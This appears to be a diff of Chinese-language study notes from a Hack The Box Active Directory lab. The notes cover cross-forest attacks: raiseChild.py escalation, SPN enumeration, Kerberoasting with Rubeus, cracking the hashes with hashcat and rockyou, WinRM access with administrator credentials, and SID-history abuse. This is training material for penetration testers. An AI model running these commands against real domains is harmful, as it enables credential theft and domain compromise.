@@ -98,9 +98,12 @@ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_
 C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName      枚举SPN账户
 C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof      枚举 mssqlsvc 账户
 C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap            跨林攻击
-用hashcat破解
+hashcat -m 13100 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
 
 C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL      枚举不属于本域用户的组
 C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator      通过 WinRM 连接来验证此访问权限
 
+如果一个用户从一个林迁移到另一个林，并且没有启用 SID 筛选 (SID Filtering)，那么就有可能添加来自另一个林的 SID，而这个 SID 在跨信任进行身份验证时会被添加到用户的令牌 (token) 中
+
+跨林攻击Linux
 
